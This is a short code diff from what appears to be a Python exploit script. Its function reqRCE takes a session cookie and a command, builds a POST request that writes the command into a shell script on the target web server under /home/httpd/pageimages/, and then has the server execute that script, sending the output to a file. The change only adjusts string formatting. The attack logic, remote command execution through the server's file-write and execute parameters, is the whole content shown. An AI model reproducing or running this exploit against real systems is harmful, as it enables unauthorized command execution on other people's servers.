@@ -67,10 +67,10 @@ def reqRCE(xCookie, xCommand):
 											'script1'	: 'file', 
 											'filename1'	: '/home/httpd/pageimages/cowTeam.sh',
 											'maxsize1'	: '9100', 
-											'content1'	: '/bin/'+xCommand+' >'+"/home/httpd/cmdOut.txt", 
+											'content1'	: '/bin/'+xCommand+' > '+'/home/httpd/cmdOut.txt', 
 
 											'script2'	: 'execute',
-											'path2'		: 'sh  /home/httpd/pageimages/cowTeam.sh'
+											'path2'		: 'sh '+'/home/httpd/pageimages/cowTeam.sh'
 										})
 	contentType = len(str(thePost))
 
